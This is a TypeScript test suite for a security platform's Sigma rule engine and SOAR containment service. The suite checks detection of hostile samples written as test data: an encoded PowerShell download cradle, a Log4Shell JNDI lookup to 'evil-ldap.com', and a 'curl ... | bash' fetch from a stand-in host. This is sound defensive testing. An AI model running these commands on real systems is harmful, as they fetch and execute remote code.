import assert from 'assert';
import { test, describe, before, after } from 'node:test';
import express from 'express';
import http from 'http';
import jwt from 'jsonwebtoken';
import { SigmaYamlEngine } from '../services/sigmaYamlEngine.js';
import { SoarService } from '../services/soarService.js';
import { sigmaRouter } from '../routes/sigmaRoutes.js';
import { soarRouter } from '../routes/soarRoutes.js';
import { authenticateJwt } from '../middleware/auth.js';
import { memoryDb } from '../db/client.js';

describe('Sigma Rules (Detection-as-Code) & SOAR Playbook Actions Suite', () => {
  let server: http.Server;
  let baseUrl: string;
  let adminToken: string;
  let analystToken: string;
  let viewerToken: string;
  const JWT_SECRET = 'ci_test_jwt_secret_github_actions_pipeline_key';

  before(async () => {
    process.env.JWT_SECRET = JWT_SECRET;
    process.env.PLATFORM_MODE = 'DEMO';

    adminToken = jwt.sign({ id: 'u-admin', username: 'sec-lead', role: 'Admin' }, JWT_SECRET, { expiresIn: '1h' });
    analystToken = jwt.sign({ id: 'u-analyst', username: 'analyst-1', role: 'Analyst' }, JWT_SECRET, { expiresIn: '1h' });
    viewerToken = jwt.sign({ id: 'u-viewer', username: 'auditor-1', role: 'Viewer' }, JWT_SECRET, { expiresIn: '1h' });

    const app = express();
    app.use(express.json());

    app.use('/api/sigma', authenticateJwt, sigmaRouter);
    app.use('/api/soar', authenticateJwt, soarRouter);

    await new Promise<void>((resolve) => {
      server = http.createServer(app);
      server.listen(0, '127.0.0.1', () => {
        const addr = server.address() as any;
        baseUrl = `http://127.0.0.1:${addr.port}`;
        resolve();
      });
    });
  });

  after(async () => {
    if (server) {
      await new Promise<void>((resolve) => server.close(() => resolve()));
    }
  });

  describe('1. Sigma YAML Detection Engine (Detection-as-Code)', () => {
    const engine = SigmaYamlEngine.getInstance();

    test('Loads canonical Sigma YAML rules from disk', () => {
      const count = engine.getRuleCount();
      assert.ok(count >= 7, `Expected at least 7 Sigma rules loaded, got ${count}`);

      const psRule = engine.getRuleById('f0230623-1d0a-47fa-8025-0a91176b5db9');
      assert.ok(psRule, 'PowerShell Encoded Command rule must be loaded');
      assert.strictEqual(psRule.level, 'critical');
      assert.ok(psRule.tags?.includes('attack.t1059.001'), 'Must include MITRE T1059.001 tag');

      const mitreTechniques = SigmaYamlEngine.extractMitreTechniques(psRule.tags);
      assert.ok(mitreTechniques.includes('T1059.001'), 'Extracted MITRE technique should include T1059.001');
    });

    test('Accurately matches EventID 4688 and Base64 encoded PowerShell execution', () => {
      const maliciousEvent = {
        id: 'evt-001',
        eventId: '4688',
        computer: 'DC-SRV-01',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AcwBpAHQAZQAvAGEAJwApAA==',
        user: 'SYSTEM',
      };

      const matches = engine.evaluateEvent(maliciousEvent);
      assert.ok(matches.length > 0, 'Should trigger at least 1 Sigma rule match');

      const psMatch = matches.find((m) => m.ruleId === 'f0230623-1d0a-47fa-8025-0a91176b5db9');
      assert.ok(psMatch, 'Should specifically match the PowerShell Encoded rule');
      assert.strictEqual(psMatch.level, 'critical');
      assert.strictEqual(psMatch.source, 'sigma-yaml');
    });

    test('Accurately matches EventID 1102 (Audit Log Cleared)', () => {
      const auditClearEvent = {
        id: 'evt-002',
        eventId: '1102',
        computer: 'FILE-SRV-02',
        details: 'The audit log was cleared by Administrator',
        user: 'Administrator',
      };

      const matches = engine.evaluateEvent(auditClearEvent);
      const clearMatch = matches.find((m) => m.ruleId === 'd76c0293-9bb6-46f3-8b77-cfc4856f6b5b');
      assert.ok(clearMatch, 'Should match EventID 1102 Audit Log Cleared');
      assert.strictEqual(clearMatch.level, 'critical');
    });

    test('Accurately matches Log4Shell CVE-2021-44228 JNDI lookup strings', () => {
      const jndiEvent = {
        id: 'evt-003',
        sourceIp: '198.51.100.88',
        details: 'Inbound HTTP GET /search?q=${jndi:ldap://evil-ldap.com:1389/Exploit} HTTP/1.1',
      };

      const matches = engine.evaluateEvent(jndiEvent);
      const log4jMatch = matches.find((m) => m.ruleId === 'a1098452-f472-4b20-99bb-928472910fed');
      assert.ok(log4jMatch, 'Should detect JNDI injection targeting Log4j');
      assert.strictEqual(log4jMatch.level, 'critical');
    });

    test('Safely produces 0 detections on benign normal event', () => {
      const benignEvent = {
        id: 'evt-benign-001',
        eventId: '4624',
        computer: 'DESKTOP-BENIGN',
        image: 'C:\\Program Files\\Google\\Chrome\\chrome.exe',
        commandLine: 'chrome.exe --type=utility',
        user: 'alice',
      };

      const matches = engine.evaluateEvent(benignEvent);
      assert.strictEqual(matches.length, 0, 'Benign activity must not generate false positives');
    });

    test('Tests custom Sigma rule YAML dynamically', () => {
      const customYaml = `
title: Test Malicious Curl Downloader
id: custom-test-001
status: test
level: high
tags:
  - attack.t1105
detection:
  selection:
    commandLine|contains:
      - 'curl -s http://'
      - 'wget http://'
  condition: selection
`;
      const testEvents = [
        { id: '1', commandLine: 'curl -s http://malicious.cc/shell.sh | bash' },
        { id: '2', commandLine: 'ls -la /tmp' },
      ];

      const testResult = engine.testRuleAgainstEvents(customYaml, testEvents);
      assert.strictEqual(testResult.success, true);
      assert.strictEqual(testResult.matches.length, 1);
      assert.strictEqual(testResult.matches[0].event.id, '1');
      assert.strictEqual(testResult.matches[0].match.ruleId, 'custom-test-001');
    });
  });

  describe('2. SOAR Playbook Containment & Webhook Actions', () => {
    test('Generates syntax-compliant iptables, AWS WAF, and Windows netsh commands', () => {
      const targetIp = '203.0.113.55';
      const rules = SoarService.generateFirewallRules(targetIp, 'C2 Beaconing detected');

      assert.strictEqual(rules.ip, targetIp);
      assert.ok(rules.iptables.blockCommands.some((c) => c.includes(`iptables -I INPUT -s ${targetIp} -j DROP`)));
      assert.ok(rules.iptables.blockCommands.some((c) => c.includes(`iptables -I FORWARD -s ${targetIp} -j DROP`)));
      assert.ok(rules.iptables.blockCommands.some((c) => c.includes(`ipset add -exist blacklist ${targetIp}`)));

      assert.ok(rules.awsWaf.cliCommand.includes(targetIp));
      assert.ok(rules.awsWaf.cliCommand.includes('update-ip-set'));

      assert.ok(rules.windowsNetsh.blockCommand.includes(targetIp));
      assert.ok(rules.windowsNetsh.blockCommand.includes('netsh advfirewall firewall add rule'));
    });

    test('Enforces IP containment block and stores in active blocklist', () => {
      const blockIp = '198.51.100.99';
      const result = SoarService.blockIp({
        ip: blockIp,
        reason: 'Automated test threat block',
        severity: 'Critical',
        incidentId: 'INC-2026-TEST',
        analyst: 'Unit-Tester',
      });

      assert.strictEqual(result.success, true);
      assert.ok(result.record);
      assert.strictEqual(result.record.ip, blockIp);
      assert.strictEqual(result.record.status, 'ACTIVE');

      const activeList = SoarService.getBlockedIps();
      assert.ok(activeList.some((b) => b.ip === blockIp));
    });

    test('Protects loopback address (127.0.0.1) from accidental block without force flag', () => {
      const result = SoarService.blockIp({ ip: '127.0.0.1', reason: 'Accident test' });
      assert.strictEqual(result.success, false);
      assert.ok(result.error?.includes('Loopback'));
    });

    test('Unblocks previously contained IP cleanly', () => {
      const unblockIp = '198.51.100.99';
      const result = SoarService.unblockIp(unblockIp, 'Unit-Tester');
      assert.strictEqual(result.success, true);

      const activeList = SoarService.getBlockedIps();
      assert.ok(!activeList.some((b) => b.ip === unblockIp));
    });

    test('Formats compliant Slack and TheHive JSON alerting payloads', () => {
      const opts = {
        incidentId: 'INC-2026-888',
        title: 'Mimikatz LSASS Access Detected',
        severity: 'Critical',
        details: 'Host WIN-10 dump LSASS memory space',
        targetIp: '192.168.1.105',
        mitreTechnique: 'T1003.001',
      };

      const slackPayload: any = SoarService.buildSlackPayload(opts);
      assert.ok(slackPayload.text.includes('SOAR ALERT - CRITICAL'));
      assert.ok(Array.isArray(slackPayload.attachments));

      const thehivePayload: any = SoarService.buildTheHivePayload(opts);
      assert.ok(thehivePayload.title.includes('CRITICAL'));
      assert.strictEqual(thehivePayload.severity, 4);
      assert.strictEqual(thehivePayload.sourceRef, 'INC-2026-888');
      assert.strictEqual(thehivePayload.artifacts[0].data, '192.168.1.105');
    });

    test('SSRF Guard: blocks dispatch to cloud metadata 169.254.169.254', () => {
      const check1 = SoarService.validateWebhookUrl('http://169.254.169.254/latest/meta-data/');
      assert.strictEqual(check1.valid, false);
      assert.ok(check1.reason?.includes('SSRF'));

      const check2 = SoarService.validateWebhookUrl('http://metadata.google.internal/computeMetadata/v1/');
      assert.strictEqual(check2.valid, false);

      const check3 = SoarService.validateWebhookUrl('ftp://invalid-protocol.com/webhook');
      assert.strictEqual(check3.valid, false);
    });

    test('Dispatches simulated webhook with HTTP 200 and audit log when unconfigured', async () => {
      const result = await SoarService.dispatchWebhookAlert({
        incidentId: 'INC-2026-SIM',
        title: 'Suspicious Reconnaissance Surge',
        severity: 'High',
        details: 'Simulated dispatch test',
        destinationType: 'slack',
      });

      assert.strictEqual(result.success, true);
      assert.strictEqual(result.simulated, true);
      assert.strictEqual(result.status, 200);
      assert.ok(result.payload);

      const history = SoarService.getExecutionHistory(5);
      assert.ok(history.some((h) => h.actionType === 'WEBHOOK_DISPATCH'));
    });

    test('Generates EDR host isolation PowerShell and Bash scripts', () => {
      const winScript = SoarService.generateHostIsolationScript('DC-01', 'windows');
      assert.ok(winScript.script.includes('New-NetFirewallRule'));
      assert.ok(winScript.rollback.includes('Remove-NetFirewallRule'));

      const linuxScript = SoarService.generateHostIsolationScript('192.168.1.200', 'linux');
      assert.ok(linuxScript.script.includes('iptables -P INPUT DROP'));
      assert.ok(linuxScript.rollback.includes('iptables -P INPUT ACCEPT'));
    });
  });

  describe('3. REST API Endpoint Integration & RBAC Enforcement', () => {
    test('GET /api/sigma/rules returns all loaded rules with metadata', async () => {
      const res = await fetch(`${baseUrl}/api/sigma/rules`, {
        headers: { Authorization: `Bearer ${analystToken}` },
      });
      assert.strictEqual(res.status, 200);
      const data: any = await res.json();
      assert.ok(data.total >= 7);
      assert.ok(Array.isArray(data.rules));
      assert.ok(data.rules[0].id);
      assert.ok(data.rules[0].rawYaml);
    });

    test('POST /api/sigma/test evaluates test rule against logs', async () => {
      const res = await fetch(`${baseUrl}/api/sigma/test`, {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${analystToken}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          yaml: `
title: API Test Rule
id: api-test-rule-01
detection:
  selection:
    details|contains: 'Unauthorized sudo'
  condition: selection
`,
          events: [{ id: 'evt-test-1', details: 'Unauthorized sudo access attempt by www-data' }],
        }),
      });

      assert.strictEqual(res.status, 200);
      const data: any = await res.json();
      assert.strictEqual(data.success, true);
      assert.strictEqual(data.matchCount, 1);
    });

    test('POST /api/soar/playbooks/block-ip blocks IP and returns firewall rules', async () => {
      const res = await fetch(`${baseUrl}/api/soar/playbooks/block-ip`, {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${analystToken}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ip: '203.0.113.199',
          reason: 'API Integration Test Block',
          severity: 'Critical',
        }),
      });

      assert.strictEqual(res.status, 201);
      const data: any = await res.json();
      assert.ok(data.record);
      assert.strictEqual(data.record.ip, '203.0.113.199');
      assert.ok(data.record.firewallRules.iptables);
    });

    test('GET /api/soar/blocked-ips lists actively blocked IPs', async () => {
      const res = await fetch(`${baseUrl}/api/soar/blocked-ips`, {
        headers: { Authorization: `Bearer ${viewerToken}` },
      });
      assert.strictEqual(res.status, 200);
      const data: any = await res.json();
      assert.ok(data.total >= 1);
      assert.ok(data.blockedIps.some((b: any) => b.ip === '203.0.113.199'));
    });

    test('POST /api/soar/playbooks/unblock-ip successfully removes IP from blocklist', async () => {
      const res = await fetch(`${baseUrl}/api/soar/playbooks/unblock-ip`, {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${adminToken}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ ip: '203.0.113.199' }),
      });

      assert.strictEqual(res.status, 200);
      const data: any = await res.json();
      assert.ok(data.message.includes('unblocked'));
    });

    test('RBAC: Viewer role is forbidden from triggering SOAR containment (403)', async () => {
      const res = await fetch(`${baseUrl}/api/soar/playbooks/block-ip`, {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${viewerToken}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ ip: '10.0.0.99' }),
      });

      assert.strictEqual(res.status, 403);
    });
  });
});
